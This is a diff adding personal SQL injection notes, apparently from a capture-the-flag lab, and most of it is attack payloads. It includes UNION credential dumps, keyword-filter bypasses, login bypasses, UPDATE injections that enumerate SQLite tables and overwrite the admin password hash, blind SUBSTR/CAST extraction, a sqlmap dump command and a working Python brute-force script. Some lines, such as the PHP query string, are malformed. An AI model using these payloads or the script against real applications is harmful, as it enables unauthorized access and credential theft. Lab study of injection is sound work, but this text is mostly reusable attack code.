@@ -242,6 +242,167 @@ Select user,password from mysql.user;
 '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
 
 
++UNION+SELECT+NULL,username||'~'||password+FROM+users--
+
+      $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");
+
+username: adm'||'in
+password: ' glob '*
+
+1. SELECT * FROM users WHERE username='admin'--' AND password='a'
+
+2. Bypass comment(--) = admin'/*
+' union select * from users where username in("admin")/*
+
+3. '/**/union/**/select*from/**/users/**/where/**/username/**/in("admin")/*
+
+4. '/**/union/**/select*from/**/users/**/where/**/username/**/in(char(97,100,109,105,110))/* OR adm'||'in'/*
+
+5.  
+
+
+Full query:
+
+SELECT username, password FROM users WHERE username='adm'||'in' AND password='' glob '*' 
+
+
+$query = "SELECT * FROM users WHERE username='" + $_POST["user"] + "' AND password= '" + $_POST["password"]$ + '";"
+
+The reason for using  -- - instead of -- is primarily because of how MySQL handles the double-dash comment style.
+
+From a --  sequence to the end of the line. In MySQL, the --  (double-dash) comment style requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on). This syntax differs slightly from standard SQL comment syntax, as discussed in Section 1.7.2.4, “'--' as the Start of a Comment”. 
+
+
+1 or 1=1-- -     For Integer Value
+
+1' or '1'='1'-- - For String Value
+
+asd',nickName='test',email='hacked
+
+UPDATE <table_name> SET nickName='name', email='email' WHERE <condition>
+
+
+
+    # MySQL and MSSQL
+',nickName=@@version,email='
+# For Oracle
+',nickName=(SELECT banner FROM v$version),email='
+# For SQLite
+',nickName=sqlite_version(),email='
+
+   The group_concat() function is used to dump all the tables simultaneously.
+
+',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
+
+',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='
+
+',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='
+
+', password='008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601' WHERE name='Admin'-- -
+
+https://www.kirsle.net/wizards/flask-session.cgi -- Flask session cookie dacoder
+
+http://10.10.196.249:5000/download/decode_cookie.py --Custom Script to decode  Flask Session
+
+SUBSTR( string, <start>, <length>)
+
+            -- Changing start
+          SUBSTR("THM{Blind}", 1,1) = T
+          SUBSTR("THM{Blind}", 2,1) = H
+          SUBSTR("THM{Blind}", 3,1) = M
+ 
+           -- Changing length
+          SUBSTR("THM{Blind}", 1,3) = THM
+
+(SELECT password FROM users LIMIT 0,1)
+
+LIMIT <OFFSET>, <LIMIT>
+
+                sqlite> SELECT password FROM users LIMIT 0,1
+                     THM{Blind}
+               sqlite> SELECT password FROM users LIMIT 1,1
+                     Summer2019!
+               sqlite> SELECT password FROM users LIMIT 0,2
+                     THM{Blind}
+                     Summer2019!
+
+           ## The SQL query to return the first character of the admin's password can be seen here:
+---> SUBSTR((SELECT password FROM users LIMIT 0,1),1,1)
+
+          ## Now we will need a way to compare the first character of the password with our guessed value. Comparing the characters are easy, and we could do it as follows:
+----->  SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = 'T'
+
+However, whether this approach works or not will be depending on how the application handles the inputs.The application will convert the username to lowercase for this challenge, which breaks the mentioned approach since capital T is not the same as lowercase t. 
+The hex representation of ASCII T is 0x54 and 0x74 for lowercase t. To deal with this, we can input our character as hex representation via the substitution type X and then use SQLite's CAST expression to convert the value to the datatype the database expects.
+
+"x,X: The argument is an integer which is displayed in hexadecimal. Lower-case hexadecimal is used for %x and upper-case is used for %X" - (sqlite.org)
+
+This means that we can input T as X'54'. To convert the value to SQLite's Text type, we can use the CAST expression as follows: CAST(X'54' as Text). Our final query now looks as follows:
+        SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)
+        
+Before using the query we have built, we will need to make it fit in with the original query. Our query will be placed in the username field. 
+We can close the username parameter by adding a single quote (') and then append an AND operator to add our condition to it. 
+Then append two dashes (--) to comment out the password check at the end of the query. With this done, our malicious query look as follows:        
+
+admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
+
+SELECT id, username FROM users WHERE username = 'admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)
+
+    FIND THE PASSWORD LENGTH:
+admin' AND length((SELECT password from users where username='admin'))==37-- -
+
+$ sqlmap -u http://10.10.196.249:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump
+
+
+          
+          
+          
+          
+
+                                               #!/usr/bin/python3
+                                               import sys
+                                               import requests
+                                               import string
+
+
+                                               def send_p(url, query):
+                                                   payload = {"username": query, "password": "admin"}
+                                                   try:
+                                                       r = requests.post(url, data=payload, timeout=3)
+                                                   except requests.exceptions.ConnectTimeout:
+                                                       print("[!] ConnectionTimeout: Try to adjust the timeout time")
+                                                       sys.exit(1)
+                                                   return r.text
+
+
+                                               def main(addr):
+                                                   url = f"http://{addr}/challenge3/login"
+                                                   flag = ""
+                                                   password_len = 38
+                                                   # Not the most efficient way of doing it...
+                                                   for i in range(1, password_len):
+                                                       for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}":
+                                                           # Convert char to hex and remove "0x"
+                                                           h = hex(ord(c))[2:]
+                                                           query = "admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1)," \
+                                                               f"{i},1)=CAST(X'{h}' AS TEXT)--"
+
+                                                           resp = send_p(url, query)
+                                                           if not "Invalid" in resp:
+                                                               flag += c
+                                                               print(flag)
+                                                   print(f"[+] FLAG: {flag}")
+
+
+                                               if __name__ == "__main__":
+                                                   if len(sys.argv) == 1:
+                                                       print(f"Usage: {sys.argv[0]} MACHINE_IP:PORT")
+                                                       sys.exit(0)
+                                                   main(sys.argv[1])
+
+
+
+
 
 
 
